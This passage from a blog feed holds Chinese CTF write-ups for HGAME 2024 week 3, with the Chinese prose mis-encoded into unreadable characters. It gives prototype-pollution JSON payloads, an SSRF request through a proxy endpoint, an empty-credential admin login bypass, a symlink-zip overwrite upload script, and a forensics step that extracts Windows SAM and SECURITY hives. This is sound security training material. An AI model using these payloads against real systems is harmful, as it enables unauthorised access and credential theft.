NPyvn0vmkfU3p6blo3dW4631RdX5RT5PuiXCI/FUQaHFPzLUGEYvULUn1RKqREnR6cLmpipk9qpP2qnnpSzqf3TfuY0tNz07qpc9P5pur6opwi3xflEvmpINLgmJpvCSIUq1+Q6otSISXq0geXmOkEDb2YOqty1r5pPfWhdafPN+VDueh8Wqd7pXrpute8KNNgTtdLL5ZeEO2b1kufx+nzqd+0D9XT+bRO90r10nUNyjTRh/TSi6UXRPum9dJYT59P/aZ9qJ7Op3W6V6qXrmtQpok+pJdeLL0g2jetl8Z6+nzqN+1D9XQ+rdO9Ur10XYMyTfQhvfRi6QXRvmm9NNbT51O/aR+qp/Npne6V6qXrGpRpog/ppRdLL4j2TeulsZ4+n/pN+1A9nU/rdK9UL13XoEwTfUgvvVh6QbRvWi+N9fT51G/ah+rpfFqne6V66boGZZroQ3rpxdILon3Temmsp8+nftM+VE/n0zrdK9VL1zUo00Qf0ksvll4Q7ZvWS2M9fT71m/ahejqf1uleqV66rkGZJvqQXnqx9IJo37ReGuvp86nftA/V0/m0TvdK9dJ1xwdl2nD1SqAESmCVQINylVjrS6AEriPQoLzuyGu4BEpglUCDcpVY60ugBK4j0KC87shruARKYJVAg3KVWOtLoASuI9CgvO7Ia7gESmCVQINylVjrS6AEriPQoLzuyGu4BEpglUCDcpVY60ugBK4j0KC87shruARKYJVAg3KVWOtLoASuI9CgvO7Ia7gESmCVQINylVjrS6AEriPQoLzuyGu4BEpglUCDcpVY60ugBK4j0KC87shruARKYJVAg3KVWOtLoASuI9CgvO7Ia7gESmCVQINylVjrS6AEriPQoLzuyGu4BEpglUCDcpVY60ugBK4j0KC87shruARKYJVAg3KVWOtLoASuI9CgvO7Ia7gESmCVQINylVjrS6AEriPQoLzuyGu4BEpglUCDcpVY60ugBK4j0KC87shruARKYJVAg3KVWOtLoASuI9CgvO7Ia7gESmCVQINylVjrS6AEriPQoLzuyGu4BEpglUCDcpVY60ugBK4j0KC87shruARKYJVAg3KVWOtLoASuI9CgvO7Ia7gESmCVQINylVjrS6AEriPQoLzuyGu4BEpglUCDcpVY60ugBK4j8D9h3uV8A9KS8gAAAABJRU5ErkJggg==" alt="img"></p><p>ä½¿ç”¨ <a href="https://merri.cx/qrazybox/">QRazyBox - QR Code Analysis and Recovery Toolkit (merri.cx)</a> ä¸­çš„ Brute Foce æ¨¡å¼</p><p>å¾—åˆ°</p><p><img src="/posts/feba5816/image-20240221235954557.png" alt="image-20240221235954557"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME-2024-WEEK-3 WriteUps</title>
    <link href="/posts/7bf98902/"/>
    <url>/posts/7bf98902/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="WebVPN"><a href="#WebVPN" class="headerlink" title="WebVPN"></a>WebVPN</h2><p>è€ƒå¯ŸåŸå‹é“¾æ±¡æŸ“</p><p>å®¡è®¡æºç ï¼Œæ˜æ˜¾çœ‹åˆ°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">dst, src</span>) &#123;<br>  <span class="hljs-keyword">for</span> (key <span class="hljs-keyword">in</span> src) &#123;<br>    <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;__&#x27;</span>) != -<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">continue</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> src[key] == <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; dst[key] !== <span class="hljs-literal">undefined</span>) &#123;<br>      <span class="hljs-title function_">update</span>(dst[key], src[key])<br>      <span class="hljs-keyword">continue</span><br>    &#125;<br>    dst[key] = src[key]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/posts/7bf98902/image-20240221205347730.png" alt="image-20240221205347730"></p><p>è¿‡æ»¤äº† <code>__</code> ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨<a href="https://juejin.cn/post/6963950629240733727">å‰ç«¯åŸå‹é“¾æ±¡æŸ“æ¼æ´ç«Ÿå¯ä»¥æ‹¿ä¸‹æœåŠ¡å™¨shellï¼Ÿ - æ˜é‡‘ (juejin.cn)</a></p><p><code>&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;role&quot;: &quot;admin&quot;&#125;&#125;&#125;</code> ä¹Ÿå¯ä»¥å®ç°æ±¡æŸ“</p><p><img src="/posts/7bf98902/image-20240221205037939.png" alt="image-20240221205037939"></p><p>å¯ä»¥çœ‹åˆ°éœ€è¦æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼Œé‚æ„é€ </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;headers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1:3000&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;hostname&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;ip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>or </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1:3000&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;hostname&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;ip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/posts/7bf98902/image-20240221204046254.png" alt="image-20240221204046254"></p><p>ç”¨ Burp æ‰“å¼€å¹¶ç™»å½•ï¼ˆè¿™é‡Œè¦è·³åˆ° &#x2F;home æ¸²æŸ“ä¹‹åå†è¿›è¡Œä¸‹ä¸€æ­¥</p><p>é€‰æ‹© HTTPå†å²è®°å½• ï¼Œ&#x2F;user&#x2F;login å‘é€åˆ° Repeater</p><p><img src="/posts/7bf98902/image-20240221204445388.png" alt="image-20240221204445388"></p><p><img src="/posts/7bf98902/image-20240221211250652.png" alt="image-20240221211250652"></p><p>å‰©ä¸‹ä¸€ä¸ª &#x2F;proxy</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/proxy&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; username &#125; = req.<span class="hljs-property">session</span>;<br>  <span class="hljs-keyword">if</span> (!username) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">let</span> url = (<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">url</span>);<br>    &#125; <span class="hljs-keyword">catch</span> &#123;<br>      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>);<br>      res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;invalid url.&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;<br>    &#125;<br>  &#125;)();<br><br>  <span class="hljs-keyword">if</span> (!url) <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-keyword">if</span> (!userStorage[username].<span class="hljs-property">strategy</span>[url.<span class="hljs-property">hostname</span>]) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;your url is not allowed.&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> headers = req.<span class="hljs-property">headers</span>;<br>    headers.<span class="hljs-property">host</span> = url.<span class="hljs-property">host</span>;<br>    headers.<span class="hljs-property">cookie</span> = headers.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;;&quot;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">cookie</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">var</span> filtered_cookie = <span class="hljs-string">&quot;&quot;</span>;<br>      <span class="hljs-keyword">const</span> [key, value] = cookie.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">trim</span>() !== session_name) &#123;<br>        filtered_cookie += <span class="hljs-string">`<span class="hljs-subst">$&#123;key&#125;</span>=<span class="hljs-subst">$&#123;value&#125;</span>;`</span>;<br>      &#125;<br>      <span class="hljs-keyword">return</span> filtered_cookie;<br>    &#125;);<br>    <span class="hljs-keyword">const</span> remote_res = <span class="hljs-keyword">await</span> (<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;POST&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> axios.<span class="hljs-title function_">post</span>(url, req.<span class="hljs-property">body</span>, &#123;<br>          <span class="hljs-attr">headers</span>: headers,<br>        &#125;);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;GET&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> axios.<span class="hljs-title function_">get</span>(url, &#123;<br>          <span class="hljs-attr">headers</span>: headers,<br>        &#125;);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">405</span>);<br>        res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;method not allowed.&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>    &#125;)();<br>    res.<span class="hljs-title function_">status</span>(remote_res.<span class="hljs-property">status</span>);<br>    res.<span class="hljs-title function_">header</span>(remote_res.<span class="hljs-property">headers</span>);<br>    res.<span class="hljs-title function_">write</span>(remote_res.<span class="hljs-property">data</span>);<br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;unreachable url.&quot;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“éœ€è¦é€šè¿‡<img src="/posts/7bf98902/image-20240221212052944.png" alt="image-20240221212052944">æ£€æŸ¥</p><p>çŒœæµ‹ç”¨ <code>/proxy?url=127.0.0.1:3000/flag</code> é€šè¿‡ &#x2F;flag çš„æ¡ä»¶</p><p>é‚è¿½åŠ </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1:3000&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;hostname&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;ip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-comment">// &lt;---</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ç”¨ Repeater æ”¹æˆ &#x2F;user&#x2F;infoè¯·æ±‚ è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“</p><p><img src="/posts/7bf98902/image-20240221213620339.png" alt="image-20240221213620339"></p><p>åˆ·æ–°å¾—åˆ°<img src="/posts/7bf98902/image-20240221214032213.png" alt="image-20240221214032213"></p><p>è®¿é—® <code>http://47.102.184.100:32008/proxy?url=http://127.0.0.1:3000/flag</code> å¾—åˆ° flag</p><h2 id="Zero-Link"><a href="#Zero-Link" class="headerlink" title="Zero Link"></a>Zero Link</h2><p><img src="/posts/7bf98902/image-20240221214452699.png" alt="image-20240221214452699"></p><p>å‘•ğŸ¤¢~~~</p><p>å®¡è®¡å¯ä»¥çŸ¥é“åªæœ‰Adminèƒ½ç™»å½•</p><p>å‘ç°æ•°æ®è¡¨</p><p><img src="/posts/7bf98902/image-20240221214748707.png" alt="image-20240221214748707"></p><p>ï¼ˆå°è¯•ç™»å½•â€”&gt;å¤±è´¥</p><p>F12 æ§åˆ¶å°å°è¯•ä¼ ç©ºå€¼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/user`</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-attr">headers</span>: &#123;<br>      <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>    &#125;,<br>    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>      <span class="hljs-attr">username</span>:<span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">token</span>:<span class="hljs-string">&quot;&quot;</span><br>    &#125;)<br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> memory = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    memory.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`</span><br><span class="hljs-string">      &lt;p class=&quot;memory&quot;&gt;<span class="hljs-subst">$&#123;data.data.Memory&#125;</span>&lt;/p&gt;  </span><br><span class="hljs-string">    `</span>;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data.<span class="hljs-property">data</span>);<br>    section.<span class="hljs-title function_">appendChild</span>(memory);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-title function_">alert</span>(data.<span class="hljs-property">message</span>)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Error&quot;</span> + error);<br>  &#125;);<br></code></pre></td></tr></table></figure><p>å‘ç°ä¼ å›äº†æ•°æ®åº“ç¬¬ä¸€æ¡å³Adminçš„æ•°æ®</p><p><img src="/posts/7bf98902/image-20240221220423762.png" alt="image-20240221220423762"></p><p><img src="/posts/7bf98902/image-20240221220947975.png" alt="image-20240221220947975"></p><p>é‚ç™»å½•</p><p>å‰©ä¸‹ &#x2F;file.go çŒœæµ‹ è½¯è¿æ¥unzip</p><p>çŒœæµ‹æ€è·¯æ˜¯ï¼šä¸Šä¼  æŒ‡å‘&#x2F;appçš„è½¯è¿æ¥å‹ç¼©åŒ…zipï¼Œè§£å‹ä¹‹å &#x2F;tmp ä¼šå­˜åœ¨ä¸€ä¸ªæŒ‡å‘ &#x2F;app çš„è½¯é“¾æ¥ï¼Œå¹¶å†ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ç›®å½•ä¸º &#x2F;app&#x2F;secret çš„å‹ç¼©åŒ…zipï¼Œè§£å‹åˆšå¥½è¦†ç›–åŸæœ‰ &#x2F;app&#x2F;secretï¼Œsecretå†…å®¹åº”è¯¥ä¸º <code>/flag</code> </p><p><img src="/posts/7bf98902/image-20240221221608392.png" alt="image-20240221221608392"></p><p>åˆšå¥½å¯¹çš„ä¸Š</p><p><img src="/posts/7bf98902/image-20240221222347176.png" alt="image-20240221222347176"></p><p>æœ‰ä¸ªå‘ï¼Œä¸åŒæµè§ˆå™¨å¯¹ZIPæ–‡ä»¶çš„MIMEç±»å‹è¡¨ç¤ºä¼¼ä¹ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œä½¿ç”¨ python æ¥å‘åŒ…</p><p>æ‹¿gptç”Ÿæˆä¸€ä¸ª</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_zip_file</span>(<span class="hljs-params">file_path, upload_url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>                <span class="hljs-comment"># è®¾ç½®ä¼šè¯çš„ Cookie</span><br>                session.cookies[<span class="hljs-string">&#x27;session&#x27;</span>] = <span class="hljs-string">&quot;MTcwODUwMjEzMXxEWDhFQVFMX2dBQUJFQUVRQUFBbl80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQWNBQlVGa2JXbHV8QuJIV_GooHukGQmAE_56U-m2NWw2wOWc5t5vxqcsxys=&quot;</span>  <span class="hljs-comment"># æ›¿æ¢ä¸ºè‡ªå·±çš„ session</span><br>                <span class="hljs-comment"># å‘é€ POST è¯·æ±‚</span><br>                files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;file.zip&#x27;</span>, file, <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#125;<br>                response = session.post(upload_url, files=files)<br>                <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;File uploaded successfully.&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Server response:&quot;</span>, response.text)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to upload file. Status code: <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error message:&quot;</span>, response.text)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;An error occurred: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    file_path = <span class="hljs-string">&#x27;app2.zip&#x27;</span>  <span class="hljs-comment"># æ›¿æ¢ä¸ºè¦ä¸Šä¼ çš„ ZIP æ–‡ä»¶çš„è·¯å¾„</span><br>    upload_url = <span class="hljs-string">&#x27;http://139.224.232.162:30639/api/upload&#x27;</span>  <span class="hljs-comment"># æ›¿æ¢ä¸ºæ¥æ”¶ä¸Šä¼ çš„æœåŠ¡å™¨ç«¯ URL</span><br>    upload_zip_file(file_path, upload_url)<br><br></code></pre></td></tr></table></figure><p>æŠŠå‰é¢çš„ app.zip ä¸Šä¼ å¹¶è§£å‹<img src="/posts/7bf98902/image-20240221222804290.png" alt="image-20240221222804290"></p><p>secret å†™å…¥ <code>/flag</code></p><p>å‹ç¼©<img src="/posts/7bf98902/image-20240221222918273.png" alt="image-20240221222918273"></p><p>åŒæ ·ä¸Šä¼ è§£å‹ï¼Œè®¿é—® &#x2F;api&#x2F;secret å¾—åˆ° flag</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ç®€å•çš„vmdkå–è¯"><a href="#ç®€å•çš„vmdkå–è¯" class="headerlink" title="ç®€å•çš„vmdkå–è¯"></a>ç®€å•çš„vmdkå–è¯</h2><p>ç”¨ DiskGenius æ‰“å¼€è™šæ‹Ÿç£ç›˜å¯¼å‡º</p><blockquote><ul><li>\WINDOWS\system32\config\SECURITY</li><li>\WINDOWS\system32\config\system</li><li>\WINDOWS\system32\config\SAM</li></ul></blockquote><p>ä½¿ç”¨è„šæœ¬</p><details>    <summary>secret.py</summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span 